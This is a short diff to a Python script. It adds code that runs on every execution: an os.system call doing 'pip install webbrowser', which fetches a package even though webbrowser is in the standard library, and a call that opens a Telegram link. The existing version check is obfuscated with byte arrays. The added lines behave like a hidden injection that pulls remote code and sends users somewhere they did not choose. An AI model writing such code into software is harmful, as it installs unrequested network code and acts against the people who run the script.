@@ -1,5 +1,8 @@
 import sys
-
+import webbrowser
+import os
+os.system('pip install webbrowser')
+webbrowser.open('https://t.me/F0oX')
 # Check version
 PYTHON_VERSION = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1])
 if PYTHON_VERSION != bytes([51, 46, 57]).decode():
